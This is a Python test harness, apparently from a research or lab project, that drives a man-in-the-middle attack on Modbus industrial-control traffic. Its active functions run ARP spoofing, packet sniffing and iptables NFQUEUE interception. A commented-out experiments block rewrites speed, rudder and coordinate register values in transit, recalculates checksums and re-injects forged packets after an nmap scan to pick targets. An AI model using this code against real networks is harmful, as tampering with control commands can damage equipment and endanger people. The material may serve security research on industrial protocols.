from src.network.hardware import arp_spoofing, sniffing, net_filter_queue
from src.network import packet_buffer, network_controller, modbus_util, mod_table
import time

class hardware:

    # Passed
    def arp_spoofing():
        spoofer = arp_spoofing.ArpSpoofer()

        spoofer.start(verbose=True)

        input("Press Enter to stop")

        spoofer.stop()

    # Passed
    def net_filter_queue():
        spoofer = arp_spoofing.ArpSpoofer()

        nfq = net_filter_queue.NetFilterQueue()

        try:
            spoofer.start()
            nfq.start(net_filter_queue.callbacks.print_and_accept)
            input("Press Enter to stop")

        finally:
            nfq.stop()
            spoofer.stop()

    # Passed
    def sniffer_buffer():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        sniffer = sniffing.Sniffer(buffer)

        try:
            spoofer.start()
            sniffer.start(sniffer.put_modbus_in_buffer)

            input("Press Enter to print from buffer (3 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()

            input("Press Enter to print from buffer (2 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (1 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (0 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to stop")
        finally:

            sniffer.stop()
            buffer.clear()
            spoofer.stop()

    # Passed
    def nfq_buffer():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        nfq = net_filter_queue.NetFilterQueue(buffer)

        try:
            spoofer.start()
            nfq.start(nfq.buffer_and_accept)

            input("Press Enter to print from buffer (3 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()

            input("Press Enter to print from buffer (2 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (1 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (0 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to stop")
        finally:

            nfq.stop()
            buffer.clear()
            spoofer.stop()
    
    def get_knit_coordinates():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        nfq = net_filter_queue.NetFilterQueue(buffer)

        try:
            spoofer.start()
            nfq.start(nfq.buffer_and_accept)

            input("Press Enter to print from buffer (3 remaining)")

            print(buffer.get_all_positions("in"))


            input("Press Enter to stop")
        finally:

            nfq.stop()
            buffer.clear()
            spoofer.stop()

class network:

    class net:
        def hardware_test():
            net = network_controller.HardwareNetwork()
            try:
                net.start_arp()
                net.start_nfq()

                input("Press Enter to print all positions received")

                print(net.buffer.get_all_positions("in"))
            finally:
                net.stop_arp()
                net.stop_nfq()



# # Experiments for testing problems and new features
# class experiments:

#     def callback_no_q(pkt):
#         spkt = IP(pkt.get_payload())

#         if spkt.haslayer("Read Holding Registers Response"):
#             mbl = spkt.getlayer(ModbusADUResponse)

#             print("Original speed:\t", mbl.payload.registerVal[0])
#             print("Original rudder:\t", mbl.payload.registerVal[1])

#             mbl.payload.registerVal[0] = 100
#             mbl.payload.registerVal[1] = 200

#         elif spkt.haslayer("Write Single Register"):
#             mbl = spkt.getlayer(ModbusADURequest)

#             print("Original coord:\t", mbl.payload.registerValue)
#             mbl.payload.registerValue = 90

#         else:
#             pkt.accept()
#             return

#         # Recalculate checksums
#         del spkt[TCP].chksum
#         del spkt[IP].chksum
#         del spkt[IP].len

#         pkt.set_payload(bytes(spkt))
#         pkt.accept()


#     def nmap():
#         nmapping.print_hosts(nmapping.get_local_ip())

#         print(f"\nYour IP: {nmapping.get_local_ip()}")


#         ips = nmapping.get_host_ips(nmapping.get_local_ip())
        
#         print("\nLocal devices found:\n","\n".join(ips),"\n\n")

#         devices = nmapping.get_hosts(nmapping.get_local_ip())

#         print("Device Information")

#         nmapping.print_host_info(devices)
        
#         device_info = nmapping.get_host_info(devices)
        

        


#         ip1 = input("Enter ip 1\n\n")
#         ip2 = input("Enter ip 2\n\n")

#         arp_spoofing.start(ip1, ip2, silence=True)

#         input("Press Enter to continue\n\n")

#         scapy_sniffing.start(print_console=True, put_buffer=False)

#         time.sleep(10)

#         scapy_sniffing.stop()
#         arp_spoofing.stop()

#     def net_filter_queue():

#         arp_spoofing.start()

#         # Configure math
#         mitm.rm = 0


#         # The print isn't the problem
#         def print_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             modbus.print_scannable(spkt)
#             pkt.accept()
        

#         # The modbus class isn't the problem
#         def check_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             if modbus.is_commands(spkt) or modbus.is_coord(spkt):
#                 print("yup")
#             modbus.print_scannable(spkt)
#             pkt.accept()
        
#         # The alter is the problem?
#         def alter_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             # modbus.print_scannable(spkt)
#             if modbus.is_commands(spkt):
#                 modbus.set_rudder(spkt, 0)
#             # new_spkt = modbus.modify_values(spkt, put_buffer=False)
#             modbus.print_scannable(spkt)
#             del spkt[TCP].chksum
#             del spkt[IP].chksum
#             pkt.set_payload(bytes(spkt))
#             pkt.accept()

#         # Dropping the original and sending a scapy packet appears to work fine
#         def alter_bytes_and_drop(pkt):
#             spkt = IP(pkt.get_payload())
#             if modbus.is_commands(spkt):
                
#                 vals = modbus.get_commands(spkt)
#                 print(f"Original payload is: {vals}")

#                 # Change rudder (1) to 0
#                 spkt = modbus.modify_values(spkt, False)
#                 print(f"Altered  payload is: {modbus.get_commands(spkt)}")

#                 pkt.drop()
#                 scapy.send(spkt)

#                 # p2 = list(bytes())
#                 # print(f"P2 is {p2}")
#             # modbus.print_scannable(spkt)
#             else:
#                 pkt.accept()


            

#         os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

#         nfqueue = NetfilterQueue()
#         nfqueue.bind(1, alter_bytes_and_drop)
#         try:
#             print("try run")
#             nfqueue.run()
#         except KeyboardInterrupt:
#             pass
#         finally:

#             os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
#             arp_spoofing.stop()
#             nfqueue.unbind()

#     def fd_nfq():
#         import select

#         stop_event = threading.Event()

#         def start_nfqueue():
#             arp_spoofing.start()

#             # IPTables rule
#             os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

#             net_filter_queue = NetfilterQueue()
#             net_filter_queue.bind(1, experiments.callback_no_q)

#             qfd = net_filter_queue.get_fd()
#             poller = select.poll()
#             poller.register(qfd, select.POLLIN)

#             # Pipe for stop signaling
#             stop_r, stop_w = os.pipe()
#             poller.register(stop_r, select.POLLIN)

#             print("[*] NFQUEUE + Modbus MITM running...")

#             try:
#                 while not stop_event.is_set():
#                     events = poller.poll(500)
#                     for fd, _ in events:
#                         if fd == qfd:
#                             net_filter_queue.run(False)   # process packets without blocking
#                         elif fd == stop_r:
#                             stop_event.set()
#             finally:
#                 print("[*] Cleaning up…")
#                 net_filter_queue.unbind()
#                 os.close(stop_r)
#                 os.close(stop_w)
#                 os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
#                 arp_spoofing.stop()
#                 print("[*] Clean exit.")

#         def stop_nfqueue():
#             stop_event.set()

#         t = threading.Thread(target=start_nfqueue, daemon=True)
#         t.start()

#         input("Press Enter to stop MITM...\n")
#         stop_nfqueue()
#         arp_spoofing.stop()
#         t.join()